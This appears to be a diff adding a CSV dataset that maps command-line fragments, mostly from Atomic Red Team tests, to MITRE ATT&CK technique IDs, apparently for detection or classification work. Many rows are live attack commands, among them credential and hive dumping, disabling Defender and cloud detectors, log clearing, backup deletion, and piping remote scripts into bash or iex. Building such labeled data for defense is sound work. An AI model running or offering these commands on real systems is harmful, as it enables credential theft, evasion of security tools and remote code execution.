@@ -1,0 +1,593 @@
+command,mitre_id
+reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f,T1112
+"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""",T1137
+username=$(id -u -n) && lsof -u $username,T1087
+Temp\ModeAuto\icons,T1113
+Import-Module .\Invoke-Phant0m.ps1,T1562
+import,T1546
+Get-ADComputer,T1087
+$notificationPackagesValues += $passwordFilterName,T1556
+/proc/<PID>/maps,T1003
+"Stop-Service -Name ""$service_name"" -force -erroraction silentlycontinue | Out-Null",T1543
+nbtscan,T1018
+igfxem.exe,T1574
+"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"" -Name ""TamperProtection"" -Value 0",T1562
+diskshadow.exe /s $filename,T1003
+End Sub,T1137
+$PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug,T1055
+"Write-Host "" [-] $username:${password} invalid credentials.`r`n""",T1110
+msiexec /quiet /i {PATH:.msi},T1218
+dscl . -create /Users/$username PrimaryGroupID 80,T1136
+"Start-Process ""$exe_binary""",T1027
+"Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"" -DestinationPath ""$env:userprofile\Downloads\T1036"" -Force",T1036
+"[DllImport(""user32.dll"", CharSet=CharSet.Auto)]",T1491
+schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system,T1053
+"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf",T1562
+OneDriveStandaloneUpdater,T1105
+Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko,T1071
+bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,T1105
+"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""",T1218
+AppPatch,T1546
+nbtstat -n,T1016
+GetLocalTime(),T1106
+svchosst,T1036
+esxcli network firewall set,T1562
+takeown /F C:\Windows\System32\AtBroker.exe /A,T1546
+"Set-Location ""PathToAtomicsFolder""",T1071
+"if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""Xen\|KVM\|Microsoft""; fi",T1082
+Invoke-CimMethod,T1053
+GetUserDefaultLocaleName,T1614
+"$env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""",T1567
+and,T1564
+get-process lsass | Out-Minidump,T1003
+sc start W64Time,T1543
+fork(),T1036
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""$output_file"" /target:library /keyfile:$env:Temp\key.snk $source_file",T1218
+wevtutil cl $log_name,T1070
+"copy ""$ps1_path"" %temp%\T1036.007_masquerading.rtf.ps1 /Y",T1036
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""quit"" ""quit""",T1003
+"(e.g.,",T1564
+Set-MpPreference -dscrptsc $True,T1562
+<MappedFolder>,T1564
+"for /L %a in (1,1,$limit) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\$target_hive"" %temp%\$target_hivevss%a 2 >nul 2>&1) & dir /B %temp%\$target_hivevss*",T1003
+System.Net.NetworkInformation.Ping,T1018
+shell.txt,T1140
+ilasm.exe {PATH_ABSOLUTE:.txt} /dll,T1127
+ps,T1057
+launchctl unload,T1569
+ShowWindow,T1564
+utimes(),T1070
+"Add-MailboxPermission -Identity ""$delegate_target"" -User ""$operator_mailbox"" -AccessRights FullAccess -InheritanceType All",T1098
+Gpscript /startup,T1218
+"Get-Content -Path ""$env:TEMP\silver.txt"" -Wait | ForEach-Object {",T1558
+"{cmd /c copy ""$binary_file"" ""\\$machine\$remote_drive_letter$$exe_remote_folder""",T1105
+"Write-Host ""Registry key not found. Make sure the 'TermService\Parameters' key exists.""",T1505
+$ReadResponse.BaseStream.Position = 0,T1619
+bash $autosuid,T1059
+"Write-Host ""End of bruteforce""",T1110
+powershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct,T1518
+"reg add ""HKCU\Software\Microsoft\Office\16.0\Word\Options"" /v STARTUP-PATH /t REG_SZ /d ""C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent"" /f",T1546
+"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done""",T1529
+echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));',T1140
+". ""$script_path""",T1055
+VkKeyScan,T1056
+"Invoke-Seatbelt -Command ""-group=all""",T1082
+"{echo ""Uploading $file...""",T1048
+echo \'Defaults !tty_tickets\' >> /etc/sudoers,T1548
+EnumWindows,T1055
+Invoke-ATHCompiledHelp -HHFilePath $hh_file_path -CHMFilePath $chm_file_path,T1218
+"cd ""$rclone_path""",T1567
+"copy ""$service_executable"" ""C:\Program Files\windows_service.exe""",T1574
+test.au3,T1059
+cmd /c tasklist > %temp%\temp.ini,T1057
+expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},T1105
+"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")",T1218
+Invoke-WmiMethod -Path $new_class -Name create -ArgumentList $process_to_execute,T1047
+wuauclt.exe,T1036
+Scriptrunner.exe,T1202
+Duser.dll,T1574
+"powershell.exe /c ""Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''""",T1518
+net accounts,T1201
+./stratus warmup aws.credential-access.ec2-get-password-data,T1552
+"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",T1218
+foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}},T1114
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD,T1547
+schtasks /query,T1053
+chmod +x sqlite_dump.sh,T1005
+CSIDL_APPDATA\microsoft\security,T1036
+/var/folder,T1074
+EnumResourceW(),T1106
+"Invoke-SharpUp -command ""audit""",T1082
+window.location.pathname,T1480
+CalendarChecker,T1053
+sudo kextunload $module_path,T1547
+SecKeychainItemCopyAttributesAndData,T1555
+te.exe {PATH:.dll},T1127
+"echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js",T1105
+MS17-10 -noninteractive -consoleoutput,T1046
+fsianycpu.exe {PATH:.fsscript},T1059
+Win32_MotherboardDevice,T1082
+/data/runtime/cockpit/wd.fd,T1559
+"Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\",T1547
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll},T1543
+"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp $optional_args",T1087
+Remove-ItemProperty -Path $registryPath -Name $newValueName,T1562
+"$wait.asyncwaithandle.waitone(250, $false) | Out-Null",T1016
+"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""$target_key_value_name"" -Value ""$payload""",T1547
+lstrcat,T1106
+HKU\SOFTWARE\Microsoft\CTF,T1012
+msiexec /z {PATH_ABSOLUTE:.dll},T1218
+sudo cat /etc/shadow > $output_file,T1003
+HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,T1547
+"Cd ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs""",T1204
+cscript %windir%\System32\manage-bde.wsf,T1216
+sudo log -f /var/log/system.log | : > /var/log/system.log,T1070
+net time,T1124
+reg save HKLM\\SAM sam.hiv,T1003
+C:\Windows\system32\net.exe,T1574
+"copy ""$vbs_path"" %temp%\T1036.007_masquerading.xlsx.vbs /Y",T1036
+killall,T1489
+iscsicpl.exe,T1548
+"Set-Location ""$Env:windir\System32\Tasks""",T1218
+} catch {,T1083
+echo $ENCODED | b64decode -r,T1140
+"sh -c ""echo 'echo Hello from the Atomic Red Team' > $script_path""",T1059
+rm /tmp/art_payload.sh,T1027
+.dll,T1574
+"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v InitialProgram /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f",T1112
+"msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv",T1003
+HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe,T1564
+echo 'import requests' > $python_script_name,T1059
+sctasks,T1053
+HKCU\Environment\UserInitMprLogonScript,T1037
+"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;",T1497
+Sdl,T1070
+aws guardduty delete-detector --detector-id $detectorId,T1562
+Get-ADDomain,T1482
+copy,T1105
+"echo ""*** Log Group Created ***""",T1562
+"""$Path_to_file"" 1>NUL",T1105
+kextstat 2>/dev/null | grep SoftRAID,T1547
+Remove-Item $credFile,T1098
+diskshadow.exe /s {PATH:.txt},T1003
+get-secret-value,T1555
+"$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null",T1552
+cmdexe,T1059
+$PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug,T1055
+GetUserNameW,T1106
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\,T1547
+"Write-Host ""Registry value deleted: $newValueName""",T1562
+AppData\Local\Temp,T1070
+Write-Host $results,T1016
+makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},T1105
+IOCTL_DISK_GET_LENGTH_INFO,T1680
+libdsplibs.so,T1027
+dnx.exe {PATH_ABSOLUTE:folder},T1127
+/run/shm,T1027
+cloud.sh,T1546
+Start-Dnscat2 -Domain $domain -DNSServer $server_ip,T1071
+C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm,T1137
+mshta http[:]//webserver/payload[.]hta,T1218
+lsass.exe,T1003
+$excelApp.Quit(),T1137
+echo '# KEYWORD: shutdown' >> $rc_service_path/$rc_service_file,T1543
+search-ms,T1105
+$document.Close(),T1137
+"if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=""centos""') ]; then chkconfig T1543.002 on ; else echo ""Please run this test on Ubnutu , kali OR centos"" ; fi",T1543
+Microsoft.Storage/storageAccounts/delete,T1490
+[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null,T1204
+dscl . -list /Groups,T1069
+"Add-Content $ps_profile -Value """"",T1546
+&lt;executable&gt;,T1546
+"wmic /node: ""$machine"" process call create ""regsvr32.exe /i $remote_drive_letter:$exe_remote_folder""}",T1105
+wevtutil,T1070
+"& ""PathToAtomicsFolder\T1090.003\src\Psiphon.bat""",T1090
+reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v,T1564
+"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"" /f",T1546
+"Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\logins.json"" -Destination $profile\ > $null",T1555
+"New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force",T1548
+"Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1",T1562
+"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",T1218
+docker run --name t1046_container --rm -d -t t1046,T1046
+"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f",T1112
+if ($errCode -eq 86) {,T1098
+CreateProcessAsUserA,T1134
+chown $owner $file_or_folder,T1222
+cat /proc/cpuinfo | grep -c “cpu family” 2>&1,T1082
+reg query HKLM /f password /t REG_SZ /s,T1552
+execvpe,T1574
+"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",T1053
+chmod u+s /tmp/hello,T1548
+ls -l $test_folder,T1560
+"Write-Host ""Using EDR-Freeze executable: $edrFreezeExeName"" -ForegroundColor Cyan",T1562
+"Invoke-Expression ""$input_file""",T1027
+"if [ ""$(sysctl -n hw.model | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;",T1497
+"auditctl -a always,exit -F arch=b64 -S execve -k CMDS",T1056
+condition,T1556
+svchast.exe,T1036
+sudo touch /Library/StartupItems/EvilStartup.plist,T1037
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1,T1036
+HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist,T1112
+"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",T1218
+curl -s $remote_url |bash,T1059
+libc read,T1056
+"if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT""; fi",T1562
+chmod $symbolic_mode $file_or_folder,T1222
+net localgroup users,T1069
+"Get-TransportAgent | Format-List Name,Enabled",T1505
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run,T1012
+schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I,T1053
+Zone.Identifier,T1553
+"HKEY_CURRENT_USER\Environment ""UserInitMprLogonScript""",T1037
+"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f",T1112
+Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId,T1098
+cmd.exe /c net share,T1135
+Set-MpPreference -DisableBlockAtFirstSeen 1,T1562
+"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f",T1112
+Get-ADComputer $hostname -Properties *,T1087
+.AvosLinux,T1486
+win.exe,T1036
+/System/Librarby/LaunchDaemons/ssh.plist,T1569
+& $imewdbled $remote_url,T1105
+"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value $NEW_Remote_Port",T1021
+get-localgroup,T1069
+if ($archive) { $archive.Dispose() },T1562
+chmod 777,T1222
+"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d ""1"" /f",T1222
+"secedit /import /db $secedit_db /cfg ""$ini_file""",T1547
+HKCU\Software\Classes\Applications\rundll32.exe\shell\open,T1112
+"(user permissions),",T1564
+Remove-Variable xlApp,T1204
+if ($tcp.Connected) {,T1046
+New-Item -Path $outDir -ItemType Directory -Force | Out-Null,T1083
+makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,T1564
+[attrib](https://attack.mitre.org/software/S1176) +h,T1564
+reg save HKLM\system system,T1003
+sudo $program_path -4 -p 6 -t 3,T1040
+clear logging,T1070
+Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $File_to_output,T1083
+GetComputerNameExA,T1106
+service pf stop,T1562
+Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0,T1112
+"} elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {",T1003
+.JPE,T1036
+odbcad32.exe,T1548
+MYSQL_HISTFILE,T1562
+"Write-Host ""Error parsing JSON data.""",T1539
+then sed -i '$ a #art_test_1562_006_2' /etc/$rsyslog_config_file_name,T1562
+WriteProcessMemory(),T1574
+"Invoke-EnumerateAzureBlobs -base $base -permutations ""$wordlist"" -outputfile ""$output_file""",T1619
+OpenThread,T1055
+"date ""$NOW""",T1070
+get-localuser,T1087
+which sh,T1083
+evtx,T1005
+InvokeGPUpdate,T1059
+uname -srm,T1059
+cmdl32 /vpn /lan %cd%\config,T1105
+aws logs create-log-group --log-group-name $cloudwatch_log_group_name --region $region --output json,T1562
+install_flash_player.exe,T1036
+Set-CASMailbox,T1098
+Connect-AzureRmAccount -Credential $Credential,T1555
+certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},T1105
+where /R C:\Users\ Bookmarks,T1217
+HKCU\Software\Microsoft,T1027
+.msc,T1546
+LogMein,T1219
+"reg add ""HKLM\Software\Microsoft\Windows Defender"" /v ""PUAProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
+GetSystemTimeAsFileTime,T1497
+Evil.txt,T1036
+wbadmin delete catalog -quiet,T1490
+"ls -la ""$SITE_PACKAGES/atomic_hook.pth""",T1546
+echo [InternetShortcut] > $shortcut_file_path,T1547
+IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing),T1552
+Start-ATHProcessUnderSpecificParent -ParentId $parent_pid -TestGuid $test_guid,T1134
+.zshrc,T1546
+"@FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt",T1033
+"Start-Process -FilePath ""$autoit_path"" -ArgumentList ""$script_path""",T1059
+AdjustTokenPrivileges,T1134
+reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion,T1082
+using System;,T1562
+"cscript ""$vbscript""",T1082
+"dir /s /a c:\ >> ""C:\windows\TEMP\[RANDOM].tmp""",T1083
+nltest /domain_trusts,T1016
+NtCurrentPeb,T1106
+"$sheet.Cells.Item(4,1) = ""=IF(ISNUMBER(SEARCH(`""64`"",GET.WORKSPACE(1))), GOTO(A5),)""",T1204
+"wmic.exe process call create ""{CMD}""",T1218
+oci.dll,T1574
+JamPlus,T1127
+New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription,T1098
+sensitivefiles -noninteractive -consoleoutput,T1552
+iviewers.dll,T1036
+com.apple.loginwindow.[UUID].plist,T1547
+locate *,T1083
+"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""",T1012
+RegCreateKeyExA,T1112
+net view,T1018
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}'),T1202
+DriveList,T1680
+ScriptingEngine='VBScript';,T1546
+"find $file_path/.config/gcloud -name ""credentials.db"" -o -name ""access_tokens.db"" -type f 2>/dev/null",T1552
+echo Password!>> passwords.txt,T1110
+curl http://myip.ipip.net,T1016
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM,T1547
+"Write-Host ""Failed to download or extract EDR-Freeze: $_"" -ForegroundColor Red",T1562
+netstat -naop tcp,T1049
+WinExec,T1546
+CreateProcessWithTokenW,T1134
+rundll32.exe “C:\Windows\twain_64.dll”,T1218
+/failure,T1562
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1'),T1106
+ls -la ~/Desktop,T1083
+echo '# REQUIRE: LOGIN' >> $rc_service_path/$rc_service_file,T1543
+"echo ""# THIS IS A COMMENT"" >> /etc/default/ufw",T1562
+lPH*.dll,T1083
+winfile.exe {PATH:.exe},T1202
+"Write-Host ""End of password spraying""",T1110
+NtCreateProcess,T1106
+mspub.exe {REMOTEURL},T1105
+security find-certificate -a -p > $cert_export,T1555
+"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableSecuritySettings"" /t REG_DWORD /d 1 /f",T1112
+"Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"" -OutFile $output_file",T1074
+GetCurrentProcessId,T1057
+sc query sense,T1518
+ChangeServiceConfig,T1543
+sc query,T1007
+reg save HKLM\\SECURITY security.hiv,T1003
+regsvr32,T1218
+"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""",T1218
+Wow64DisableWow64FsRedirection(),T1106
+Pcwrun.exe {PATH_ABSOLUTE:.exe},T1218
+Control_RunDLL,T1218
+postrm,T1546
+com.random.name.plist,T1543
+net group Exchange Trusted Subsystem /domain,T1069
+"if [ ""$HISTCONTROL"" != ""ignoreboth"" ]; then export HISTCONTROL=""ignoreboth""; fi",T1562
+if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force },T1546
+public class TokenAdjuster {,T1562
+tty_tickets,T1548
+"detectorId=$(aws guardduty create-detector --enable --region ""$region"" | grep -oP '(?<=""DetectorId"": "")[^""]*')",T1562
+"""$venv_path\Scripts\adidnsdump"" -u $user_name -p $acct_pass --print-zones $host_name",T1018
+AppServicesr,T1036
+/Library/LaunchAgents,T1543
+"if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))",T1562
+sudo visudo -c -f /etc/sudoers,T1548
+"Copy-Item ""$dll_path"" C:\Users\Public\AtomicTest.dll -Force",T1546
+"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 1",T1562
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList,T1564
+"Start-Process -FilePath $file ""/S""",T1219
+Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore,T1558
+truncate --size=0 /var/log/security #size parameter,T1070
+"Write-Output ""Function code download failed.""",T1528
+RestrictedAdmin,T1550
+PotPlayerDB.dat,T1036
+diskshadow delete shadows all,T1490
+{if (test-connection -Count 1 -computername $machine -quiet),T1105
+"Write-Host ""The file is empty""",T1560
+~/Downloads,T1486
+"if ($ipAddr -eq """") {",T1046
+"net group ""REDACTED"" /domain",T1087
+scheduler,T1053
+"{foreach($file in (dir $Dir_to_copy ""*.7z""))",T1048
+C:\,T1059
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control SystemStartOptions,T1012
+$xlApp.DisplayAlerts = $False,T1204
+injecthelper.dll,T1055
+if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi,T1049
+reg export HKLM\security %temp%\security,T1003
+"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/",T1110
+CGWindowListCreateImageFromArray,T1113
+InternetQueryOptionA,T1016
+Team Viewer,T1219
+"Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",T1555
+dir c:\ /b /s .key | findstr /e .key,T1552
+printf $ENCODED | xxd -r -p,T1140
+wificreds -consoleoutput -noninteractive,T1555
+Get-EventLog -list,T1070
+"Write-Output ""Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...""",T1530
+GetWindowThreadProcessId,T1106
+takeown /F C:\Windows\System32\DisplaySwitch.exe /A,T1546
+"Send-MailMessage -From $sender -To $receiver -Subject 'T1027_Atomic_Test' -Attachments ""$input_file"" -SmtpServer $smtp_server",T1027
+echo $ENCODED > $encoded_file && cat $encoded_file | base64 -d,T1140
+"if ($allowSharedKeyAccess -eq ""false"") { # $allowSharedKeyAccess could be true or null",T1528
+"Start-Process -FilePath ""$ved_path\VEDetector.exe""",T1036
+Get-Content $env:TEMP\silver.txt,T1558
+"logger.exe ""{CMD}""",T1202
+"$which_python -c ""import pty;pty.spawn('/bin/sh')""",T1059
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'),T1082
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1060
+pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},T1216
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f,T1564
+sc query windefend,T1518
+HKCU\Software\Microsoft\CurrentVersion\Run\,T1547
+"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"" ""$env:APPDATA\Microsoft\Addins\notepad.ppam""",T1137
+schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\%USERPROFILE%\Downloads\spread.exe /F,T1053
+IconEnvironmentDataBlock,T1027
+Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll,T1564
+sudo dscl . -create /Users/$user_name UniqueID 333,T1564
+Import-Module -Name AzureAD,T1098
+dscl . -append /Groups/admin GroupMembership AtomicUser,T1078
+pkill cfprefsd,T1562
+"$sheet.Cells.Item(1,1) = ""$uname""",T1204
+Mftrace.exe {PATH:.exe},T1127
+PutBucketLifecycle,T1485
+sudo sysadminctl -guestAccount on,T1078
+$requiredGraphAccess.ResourceAccess.Add($resourceAccess),T1098
+LVM_GETITEMPOSITION,T1055
+schtasks /create /sc,T1053
+SetWindowsHookEx,T1056
+Select * From Win32_SystemDriver,T1047
+unzip,T1140
+/sbin/udevd -d,T1036
+"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1",T1218
+Function,T1553
+advapi32.dll,T1070
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1'),T1106
+KRB5CCNAME,T1558
+aws configservice delete-delivery-channel --delivery-channel-name $delivery_channel_name --region $region,T1562
+.com,T1036
+"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f",T1547
+ssh_kill,T1489
+"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""",T1012
+"([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()",T1018
+Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,T1548
+kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token,T1552
+sc.exe start $service_name,T1543
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",T1112
+"Get-Item -Path ""HKLM:SYSTEM\CurrentControlSet\Control\SafeBoot""",T1012
+"C:\Windows\System32\inetsrv\appcmd.exe set config ""$website_name"" /section:httplogging /dontLog:true",T1562
+/etc/ssh/sshd_config,T1098
+net view \\remotesystem,T1135
+mktemp -t Installer,T1564
+wbadmin.msc,T1218
+<script>,T1027
+Win32_OperatingSystem,T1518
+GetUserDefaultLangID,T1614
+echo before,T1547
+Start-Process whoami.exe,T1546
+"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",T1087
+sudo cp $path_malicious_plist ~/Library/LaunchAgents/$plist_filename,T1543
+HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated,T1012
+WScript.Shell,T1559
+"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data For Account"" ""/tmp/T1555.003_Login Data For Account""",T1555
+GetTcpTable2,T1049
+ExampleFunction,T1218
+icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t,T1546
+useradd,T1136
+GetDC(),T1106
+netsh interface show,T1016
+com.apple.quarantine,T1553
+ld.so,T1574
+net user /add,T1136
+New-Item $commandpath -Force | Out-Null,T1548
+echo '' > /var/log/messages,T1070
+"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFind /t REG_DWORD /d 1 /f",T1112
+QueueName = $queue,T1619
